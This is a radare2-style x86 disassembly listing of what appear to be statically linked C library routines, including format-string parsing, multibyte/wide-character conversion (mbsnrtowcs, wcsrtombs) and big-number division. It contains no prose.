jmp 0x8067b65
lea eax, [ebp - 0x20dc]
mov dword [var_8h], esi
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
jmp 0x8067b5f
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_ch]
mov ebx, dword [arg_8h]
movzx eax, byte [ebx]
test al, al
je 0x8074676
cmp al, 0x25
je 0x8074676
lea esi, [esi]
mov dword [esi], 0
test byte [ebx], 0x80
je 0x8074680
mov eax, 0
test eax, eax
je 0x8074683
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov dword [var_8h], esi
mov eax, dword [eax + 0x58]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.080778c0
test eax, eax
jle 0x8074680
add ebx, eax
movzx eax, byte [ebx]
test al, al
je 0x8074676
cmp al, 0x25
jne 0x8074630
add esp, 0xc
mov eax, ebx
pop ebx
pop esi
leave
ret
nop
inc ebx
jmp 0x807466b
mov eax, dword [0x80a9ab4]
jmp 0x8074650
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_8h]
mov dword [var_10h], 0
mov ebx, dword [arg_10h]
mov edi, dword [arg_ch]
lea esi, [edx + 1]
movzx eax, byte [ebx + 0xd]
mov dword [arg_8h], esi
mov dword [ebx + 0x24], 0xffffffff
and byte [ebx + 0xc], 7
mov dword [ebx + 0x10], 0x20
mov ecx, esi
and eax, 0xfffffff2
mov byte [ebx + 0xd], al
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8074a79
lea esi, [esi]
movzx eax, byte [ecx]
sub eax, 0x20
cmp eax, 0x29
ja case.0x80746eb.33
jmp dword [eax*4 + 0x80a269c]
or byte [ebx + 0xc], 0x10
mov eax, ecx
inc ecx
mov dword [arg_8h], ecx
cmp byte [eax + 1], 0
jne 0x80746e0
test byte [ebx + 0xc], 0x20
je 0x807470f
mov dword [ebx + 0x10], 0x20
mov dword [ebx + 0x20], 0xffffffff
mov dword [ebx + 4], 0
mov edx, ecx
movzx eax, byte [ecx]
cmp al, 0x2a
je 0x80749db
movzx eax, al
sub eax, 0x30
cmp eax, 9
jbe 0x80749c5
mov dword [ebx + 0x1c], 0xffffffff
mov dword [ebx], 0xffffffff
mov edx, ecx
cmp byte [ecx], 0x2e
je 0x807492c
and byte [ebx + 0xc], 0xf8
and byte [ebx + 0xd], 0xfd
movzx eax, byte [ecx]
inc ecx
mov dword [arg_8h], ecx
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x807476c.77
jmp dword [eax*4 + 0x80a2744]
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x68
je 0x80748e7
or byte [ebx + 0xc], 2
movzx edx, byte [ecx]
lea eax, [ecx + 1]
mov ecx, dword [0x80aad28]
mov dword [arg_8h], eax
test ecx, ecx
mov dword [ebx + 8], edx
jne 0x80748aa
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], 1
lea eax, [ecx - 0x41]
cmp eax, 0x37
ja case.0x80747b3.66
jmp dword [eax*4 + 0x80a2800]
movzx eax, byte [ebx + 0xc]
test al, 1
je 0x8074818
mov dword [ebx + 0x28], 0x100
lea esi, [esi]
cmp dword [ebx + 0x24], 0xffffffff
je 0x8074809
test ecx, ecx
jne 0x80747ef
mov eax, dword [arg_8h]
dec eax
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov eax, dword [var_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [ebx + 0x14], eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08074610
mov dword [ebx + 0x18], eax
jmp 0x80747e4
mov eax, dword [ebx + 0x2c]
test eax, eax
je 0x80747d6
mov dword [ebx + 0x24], edi
add dword [var_10h], eax
jmp 0x80747d6
test al, 4
je 0x8074825
mov dword [ebx + 0x28], 0x200
jmp 0x80747d0
test al, 2
je 0x8074832
mov dword [ebx + 0x28], 0x400
jmp 0x80747d0
xor eax, eax
test byte [ebx + 0xd], 2
setne al
mov dword [ebx + 0x28], eax
jmp 0x80747d0
mov dword [ebx + 0x28], 2
jmp 0x80747d0
mov dword [ebx + 0x28], 4
jmp 0x80747d0
mov dword [ebx + 0x28], 1
jmp 0x80747d0
test byte [ebx + 0xc], 1
mov edx, 0x107
mov eax, 7
cmove edx, eax
mov dword [ebx + 0x28], edx
jmp 0x80747d0
mov dword [ebx + 0x28], 0x800
jmp 0x80747d0
mov dword [ebx + 0x28], 5
jmp 0x80747d0
mov dword [ebx + 0x28], 3
jmp 0x80747d0
mov dword [ebx + 0x2c], 0
jmp 0x80747d0
cmp edx, 0xff
jg 0x807479d
mov ecx, dword [0x80aad94]
mov eax, dword [ecx + edx*4]
test eax, eax
je 0x807479d
lea eax, [ebx + 0x28]
mov dword [var_4h], 1
mov dword [esp], ebx
mov dword [var_8h], eax
call dword [ecx + edx*4]
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], eax
jmp 0x80747d0
inc ecx
mov dword [arg_8h], ecx
or byte [ebx + 0xd], 2
jmp 0x8074783
or byte [ebx + 0xc], 5
mov ecx, dword [arg_8h]
jmp 0x8074783
or byte [ebx + 0xc], 4
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x6c
jne 0x8074783
inc ecx
mov dword [arg_8h], ecx
or byte [ebx + 0xc], 1
jmp 0x80748f8
and byte [ebx + 0xc], 0xfa
jmp 0x80748f8
mov ecx, dword [arg_8h]
dec ecx
mov dword [arg_8h], ecx
jmp 0x8074783
inc ecx
mov dword [arg_8h], ecx
movzx eax, byte [edx + 1]
cmp al, 0x2a
je 0x8074963
movzx eax, al
sub eax, 0x30
cmp eax, 9
jbe 0x807494e
mov dword [ebx], 0
jmp 0x8074751
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.080745c0
mov dword [ebx], eax
mov ecx, dword [arg_8h]
jmp 0x8074751
lea ecx, [edx + 2]
mov dword [arg_8h], ecx
mov esi, ecx
movzx eax, byte [edx + 2]
sub eax, 0x30
cmp eax, 9
jbe 0x8074991
mov eax, dword [ebx + 0x1c]
test eax, eax
jns 0x807495b
inc dword [var_10h]
mov eax, edi
mov ecx, esi
inc edi
mov dword [ebx + 0x1c], eax
mov dword [arg_8h], esi
jmp 0x8074751
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x8074977
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x24
jne 0x8074977
lea eax, [eax - 1]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
inc ecx
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074977
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.080745c0
mov dword [ebx + 4], eax
mov ecx, dword [arg_8h]
jmp 0x8074739
inc ecx
mov dword [arg_8h], ecx
mov esi, ecx
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8074a0b
mov eax, dword [ebx + 0x20]
test eax, eax
jns 0x80749d3
mov eax, edi
mov ecx, esi
mov dword [var_10h], 1
inc edi
mov dword [ebx + 0x20], eax
mov dword [arg_8h], esi
jmp 0x8074739
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x80749ed
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x24
jne 0x80749ed
lea eax, [eax - 1]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
inc ecx
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x80749ed
nop
or byte [ebx + 0xc], 8
jmp 0x80746f6
or byte [ebx + 0xc], 0x80
jmp 0x80746f6
or byte [ebx + 0xc], 0x40
jmp 0x80746f6
or byte [ebx + 0xc], 0x20
jmp 0x80746f6
mov dword [ebx + 0x10], 0x30
jmp 0x80746f6
or byte [ebx + 0xd], 8
jmp 0x80746f6
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x8074a92
mov eax, dword [arg_8h]
cmp byte [eax], 0x24
je 0x8074a9c
mov ecx, esi
mov dword [arg_8h], esi
jmp 0x80746e0
mov esi, dword [arg_14h]
lea ecx, [eax + 1]
lea eax, [edx - 1]
mov dword [ebx + 0x24], eax
mov dword [arg_8h], ecx
mov eax, dword [esi]
cmp edx, eax
cmovae eax, edx
mov dword [esi], eax
jmp 0x80746e0
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x20
mov dword [var_20h], 0x80a2b24
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
cmp eax, 0x20
je 0x80756bd
cmp eax, 0x30
mov dword [var_20h], 0x80a2b34
je 0x80756bd
mov ebx, 0xf
mov esi, esi
mov byte [ebx + ebp - 0x1c], al
dec ebx
jns 0x80756b0
lea eax, [var_1ch]
mov dword [var_20h], eax
mov ebx, dword [arg_10h]
cmp ebx, 0xf
jg 0x80756ec
test ebx, ebx
jle 0x80756e2
mov eax, dword [edi + 0x94]
mov edx, dword [var_20h]
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
add esp, 0x20
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi + 0x94]
mov edx, dword [var_20h]
mov dword [esp], edi
mov dword [var_8h], 0x10
mov dword [var_4h], edx
call dword [eax + 0x1c]
add esi, eax
cmp eax, 0x10
jne 0x80756e2
sub ebx, 0x10
cmp ebx, 0xf
jg 0x80756ec
jmp 0x80756c5
push ebp
mov eax, 0x80aa9cc
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x15c
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov edx, dword [arg_18h]
mov ecx, dword [arg_10h]
mov dword [var_30h], 0
mov edi, dword [arg_8h]
mov dword [var_2ch], 1
test edx, edx
cmovne eax, edx
mov dword [var_28h], eax
xor eax, eax
test ecx, ecx
je 0x8078208
mov edx, dword [arg_ch]
lea eax, [ecx - 1]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08076f30
mov edx, dword [arg_ch]
add eax, dword [edx]
inc eax
mov dword [var_148h], eax
mov eax, 0
test eax, eax
je 0x8078391
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078371
test edi, edi
mov ebx, dword [eax]
je 0x80782d6
mov eax, dword [arg_14h]
mov dword [var_3ch], edi
lea eax, [edi + eax*4]
mov dword [var_38h], eax
mov eax, dword [ebx + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_140h]
mov edx, dword [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
mov eax, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov esi, dword [var_3ch]
sub esi, edi
sar esi, 2
mov edx, eax
test eax, eax
je 0x8078270
cmp eax, 4
je 0x8078270
test edx, edx
jne 0x8078213
mov eax, esi
add esp, 0x15c
pop ebx
pop esi
pop edi
leave
ret
cmp edx, 4
jne 0x807823d
test edx, edx
je 0x8078206
cmp edx, 5
je 0x8078206
cmp edx, 4
je 0x8078206
cmp edx, 7
je 0x8078206
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078206
cmp edx, 6
je 0x8078218
cmp edx, 7
je 0x8078218
cmp edx, 5
je 0x8078218
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x81
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
test esi, esi
je 0x80782b5
mov ecx, dword [edi + esi*4 - 4]
test ecx, ecx
jne 0x8078202
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8078294
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078202
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x76
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x807826b
mov dword [var_ch], str.__mbsnrtowcs
mov dword [var_8h], 0x73
mov dword [var_4h], str.mbsnrtowcs.c
mov dword [esp], str.result___0
jmp 0x807826b
mov edx, dword [arg_ch]
xor esi, esi
lea edi, [var_13ch]
mov eax, dword [edx]
mov dword [var_144h], eax
lea eax, [var_3ch]
mov dword [var_38h], eax
nop
mov eax, dword [ebx + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_148h]
lea edx, [var_140h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], edx
mov dword [var_18h], 0
mov dword [var_10h], 0
lea edx, [var_144h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov dword [var_8h], edx
lea eax, [var_3ch]
mov dword [var_4h], eax
call dword [ebx + 0x14]
mov ecx, dword [var_3ch]
mov edx, eax
mov eax, ecx
sub eax, edi
sar eax, 2
add esi, eax
cmp edx, 5
je 0x80782f0
test edx, edx
je 0x8078361
cmp edx, 4
jne 0x8078202
mov ebx, dword [ecx - 4]
test ebx, ebx
jne 0x8078202
jmp 0x807828e
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x807818e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x807818e
mov eax, dword [0x80a9ab4]
jmp 0x8078181
push ebp
mov edx, 0x80aa9c4
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x168
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_14h]
mov dword [var_30h], 0
mov dword [var_2ch], 1
test eax, eax
cmovne edx, eax
mov eax, 0
test eax, eax
mov dword [var_28h], edx
je 0x80780c4
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x80780a4
mov edx, dword [arg_8h]
mov esi, dword [eax + 8]
test edx, edx
je 0x8077fc0
mov edx, dword [arg_ch]
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.080783a0
mov ecx, dword [arg_ch]
mov edx, eax
mov eax, dword [ecx]
lea edi, [eax + edx*4 + 4]
mov eax, dword [arg_8h]
mov dword [var_3ch], eax
add eax, dword [arg_10h]
mov dword [var_38h], eax
mov eax, dword [esi + 0x14]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_ch]
lea eax, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], edi
mov dword [esp], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
call dword [esi + 0x14]
mov ecx, eax
mov eax, dword [var_3ch]
mov ebx, eax
sub ebx, dword [arg_8h]
test ecx, ecx
je 0x8077f59
cmp ecx, 4
je 0x8077f59
nop
test ecx, ecx
jne 0x8077f01
add esp, 0x168
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x8077f26
test ecx, ecx
je 0x8077ef4
cmp ecx, 5
je 0x8077ef4
cmp ecx, 4
je 0x8077ef4
call fcn.08048b20
mov ebx, 0xffffffff
mov dword [eax], 0x54
jmp 0x8077ef4
cmp ecx, 6
je 0x8077f06
cmp ecx, 7
je 0x8077f06
cmp ecx, 5
je 0x8077f06
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x88
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
cmp byte [eax - 1], 0
jne 0x8077ef0
cmp eax, dword [arg_8h]
je 0x8077f9d
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077f7c
mov eax, dword [arg_ch]
mov dword [eax], 0
dec ebx
jmp 0x8077ef0
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7d
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x8077f54
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x7c
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf____unsigned_char___dst
jmp 0x8077f54
mov esi, esi
mov eax, dword [arg_ch]
lea edi, [var_13ch]
mov ebx, dword [eax]
mov dword [esp], ebx
call fcn.08077690
mov dword [var_14ch], ebx
lea eax, [ebx + eax*4 + 4]
xor ebx, ebx
mov dword [var_154h], eax
mov eax, dword [var_28h]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [esi + 0x14]
mov dword [var_3ch], edi
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_154h]
lea ecx, [var_148h]
lea edx, [var_14ch]
mov dword [var_14h], ecx
mov dword [var_8h], edx
mov dword [var_sp_1ch], 1
lea ecx, [var_3ch]
mov dword [var_18h], 0
mov dword [var_10h], 0
mov dword [var_4h], ecx
mov dword [var_ch], eax
mov dword [esp], esi
call dword [esi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, edi
add ebx, eax
cmp ecx, 5
je 0x8078008
test ecx, ecx
je 0x8078076
cmp ecx, 4
jne 0x8077ef0
cmp byte [edx - 1], 0
je 0x8077f76
mov dword [var_ch], str.__wcsrtombs
mov dword [var_8h], 0x5f
mov dword [var_4h], str.wcsrtombs.c
mov dword [esp], str.data.__outbuf__1___0
jmp 0x8077f54
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8077e5e
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8077e5e
mov eax, dword [0x80a9ab4]
jmp 0x8077e51
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x5c]
test eax, eax
jne 0x804d857
mov dword [ecx + 0x5c], 0xffffffff
mov eax, dword [ecx + 0x94]
mov edx, dword [arg_ch]
mov dword [esp], ecx
mov dword [var_4h], edx
call dword [eax + 0xc]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x18
mov eax, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_10h], edx
mov dword [esp], eax
call fcn.08053400
mov edx, dword [var_14h]
mov dword [var_18h], eax
movzx eax, byte [edx]
cmp al, 0x7f
je 0x8067a00
test al, al
jle 0x8067a00
inc edx
movsx esi, al
mov dword [var_14h], edx
mov edx, dword [var_10h]
sub edx, ebx
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea edi, [var_1bh]
mov dword [var_4h], ebx
mov dword [var_8h], edx
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.08053740
mov ebx, dword [var_10h]
cmp eax, edi
mov ecx, eax
jbe 0x8067a00
dec ecx
dec ebx
dec esi
movzx eax, byte [ecx]
mov byte [ebx], al
jne 0x80679f7
cmp ecx, edi
jbe 0x8067a00
mov edx, dword [var_18h]
mov esi, dword [arg_8h]
dec edx
dec ebx
test edx, edx
movzx eax, byte [edx + esi]
mov byte [ebx], al
jg 0x80679d2
mov edx, dword [var_14h]
movzx eax, byte [edx]
cmp al, 0x7f
je 0x8067a15
test al, al
jl 0x8067a15
je 0x8067a0c
inc dword [var_14h]
movsx esi, al
cmp ecx, edi
ja 0x80679c1
nop
lea esi, [esi]
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret 4
mov eax, dword [var_14h]
movsx esi, byte [eax - 1]
jmp 0x80679f7
dec ecx
dec ebx
movzx eax, byte [ecx]
cmp ecx, edi
mov byte [ebx], al
ja 0x8067a15
jmp 0x8067a00
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x44
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_38h], eax
mov dword [var_4h], eax
call fcn.0807ad50
mov esi, eax
mov dword [esp], 0x2c
mov eax, dword [var_38h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, dword [var_38h]
mov dword [var_3ch], eax
test edx, edx
jne 0x8064076
mov edx, dword [arg_ch]
sub edx, edi
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov dword [var_40h], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
mov edi, dword [arg_ch]
dec esi
cmp esi, dword [var_40h]
jb 0x8064026
movzx edx, byte [esi]
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8064037
movsx eax, dl
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x80640e1
mov eax, 0
test eax, eax
je 0x8064030
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x29]
and edx, 0xffff
mov ebx, dword [eax + edx*4 + 0x24]
mov dword [esp], ebx
call fcn.08053400
mov ecx, edi
mov edx, eax
sub ecx, eax
dec edx
test eax, eax
je 0x806401e
movzx eax, byte [edx + ebx]
mov byte [edx + ecx], al
mov eax, edx
dec edx
test eax, eax
jne 0x8064010
mov edi, ecx
dec esi
cmp esi, dword [var_40h]
jae 0x8063fc0
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8063fee
mov eax, dword [var_38h]
test eax, eax
jne 0x8064043
dec edi
mov byte [edi], dl
jmp 0x8064020
cmp dl, 0x2e
je 0x8064071
cmp dl, 0x2c
jne 0x806403e
lea ebx, [var_2ch]
mov dword [esp], ebx
call fcn.08053400
mov edx, eax
sub edi, eax
dec edx
test eax, eax
je 0x8064020
movzx eax, byte [edx + ebx]
mov byte [edx + edi], al
mov eax, edx
dec edx
test eax, eax
jne 0x8064061
jmp 0x8064020
lea ebx, [var_1ch]
jmp 0x8064050
lea ebx, [var_34h]
lea eax, [var_1ch]
mov dword [var_34h], 0
mov dword [var_30h], 0
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08077b00
mov dword [var_8h], ebx
inc eax
mov edx, 0x2e
mov dword [var_34h], 0
cmovne dx, word [var_1ch]
mov eax, dword [var_3ch]
mov dword [var_30h], 0
mov dword [var_4h], eax
lea eax, [var_2ch]
mov word [var_1ch], dx
mov dword [esp], eax
call fcn.08077b00
inc eax
mov edx, 0x2c
cmovne dx, word [var_2ch]
mov word [var_2ch], dx
jmp 0x8063f8e
mov dword [var_sp_ch], str.outdigit_value
mov dword [var_8h], 0x24
mov dword [var_4h], str..._locale_outdigits.h
mov dword [esp], str.0___n__n___9
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [var_4h]
mov edx, dword [ebx]
movzx eax, byte [edx]
lea ecx, [eax - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
ja 0x806414d
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
movzx eax, byte [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8064130
pop ebx
mov eax, ecx
leave
ret
push edi
push esi
push ebp
push ebx
mov edi, dword [arg_14h]
mov esi, dword [arg_18h]
mov ecx, dword [arg_1ch]
mov ebx, dword [arg_20h]
lea edi, [edi + ecx*4]
lea esi, [esi + ecx*4]
neg ecx
xor ebp, ebp
mov esi, esi
mov eax, dword [esi + ecx*4]
mul ebx
add eax, ebp
mov dword [edi + ecx*4], eax
adc edx, 0
mov ebp, edx
inc ecx
jne 0x808cb00
mov eax, ebp
pop ebx
pop ebp
pop esi
pop edi
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
cmp dword [arg_1ch], 1
mov dword [var_10h], 0
mov esi, dword [arg_14h]
je 0x808c67e
jle 0x808c665
cmp dword [arg_1ch], 2
je 0x808c55b
mov eax, esi
mov ebx, dword [arg_10h]
mov edi, dword [arg_1ch]
sub eax, dword [arg_1ch]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_1ch]
lea ebx, [ebx + eax*4]
mov eax, dword [arg_18h]
mov dword [arg_10h], ebx
mov edi, dword [eax + edi*4 - 4]
mov edx, dword [eax + edx*4 - 8]
mov dword [var_2ch], edi
mov dword [var_20h], edx
mov edi, ebx
mov ebx, dword [ebx + ecx*4 - 4]
cmp ebx, dword [var_2ch]
jb 0x808c42a
ja 0x808c3fc
mov eax, ecx
mov dword [esp], edi
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [var_4h], eax
call fcn.0808c330
test eax, eax
js 0x808c42a
mov ebx, dword [arg_10h]
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808d570
mov dword [var_10h], 1
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
mov ebx, dword [eax + edi*4 - 4]
mov eax, dword [arg_ch]
add eax, esi
sub eax, dword [arg_1ch]
dec eax
mov dword [var_1ch], eax
js 0x808c50a
lea esi, [esi]
mov edx, dword [arg_ch]
cmp dword [var_1ch], edx
jl 0x808c529
sub dword [arg_10h], 4
mov ecx, dword [arg_1ch]
mov esi, dword [arg_10h]
mov ecx, dword [esi + ecx*4]
mov dword [var_24h], ecx
cmp ebx, dword [var_2ch]
mov esi, 0xffffffff
je 0x808c4b0
mov edx, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov eax, dword [ecx + edx*4 - 4]
mov edx, ebx
div dword [var_2ch]
mov ecx, edx
mov esi, eax
mov eax, dword [var_20h]
mul esi
cmp edx, ecx
mov ebx, eax
jbe 0x808c515
add ecx, dword [var_2ch]
dec esi
cmp ecx, dword [var_2ch]
jb 0x808c4b0
cmp ebx, dword [var_20h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_20h]
cmp edx, ecx
ja 0x808c488
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
nop
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
mov ebx, dword [arg_10h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.0808d600
cmp dword [var_24h], eax
je 0x808c4ed
mov edi, dword [arg_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
dec esi
mov dword [var_ch], edi
mov dword [var_8h], eax
call fcn.0808c2a0
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov edi, dword [arg_10h]
mov dword [ecx + edx*4], esi
dec edx
mov esi, dword [arg_1ch]
mov dword [var_1ch], edx
mov ebx, dword [edi + esi*4 - 4]
jns 0x808c440
mov eax, dword [var_10h]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
jmp 0x808c4b0
mov esi, dword [arg_1ch]
mov edi, dword [arg_10h]
mov edx, dword [arg_1ch]
mov esi, dword [edi + esi*4 - 4]
dec edx
mov dword [var_24h], esi
js 0x808c54d
lea esi, [esi]
mov edi, dword [arg_10h]
mov eax, dword [edi + edx*4]
mov dword [edi + edx*4 + 4], eax
dec edx
jns 0x808c540
mov eax, dword [arg_10h]
mov dword [eax], 0
jmp 0x808c45c
mov edi, dword [arg_10h]
mov ecx, dword [arg_18h]
mov ebx, dword [arg_18h]
lea eax, [edi + esi*4]
mov ecx, dword [ecx + 4]
lea edx, [eax - 8]
mov ebx, dword [ebx]
mov eax, dword [eax - 8]
mov dword [arg_10h], edx
mov edx, dword [edx + 4]
mov dword [var_18h], ecx
mov dword [var_30h], ebx
cmp edx, ecx
jb 0x808c595
ja 0x808c588
cmp eax, ebx
jb 0x808c595
mov dword [var_10h], 1
sub eax, dword [var_30h]
sbb edx, dword [var_18h]
mov ecx, dword [arg_ch]
lea esi, [esi + ecx - 3]
test esi, esi
mov dword [var_14h], esi
js 0x808c608
mov ebx, dword [arg_ch]
cmp dword [var_14h], ebx
jl 0x808c657
sub dword [arg_10h], 4
cmp edx, dword [var_18h]
je 0x808c615
div dword [var_18h]
mov dword [var_2ch], eax
mov ecx, edx
mul dword [var_30h]
mov esi, dword [arg_10h]
mov esi, dword [esi]
mov dword [var_28h], esi
nop
lea esi, [esi]
cmp edx, ecx
ja 0x808c5db
jne 0x808c5ec
cmp eax, dword [var_28h]
jbe 0x808c5ec
add ecx, dword [var_18h]
dec dword [var_2ch]
sub eax, dword [var_30h]
sbb edx, 0
cmp ecx, dword [var_18h]
jae 0x808c5d0
mov edi, dword [var_14h]
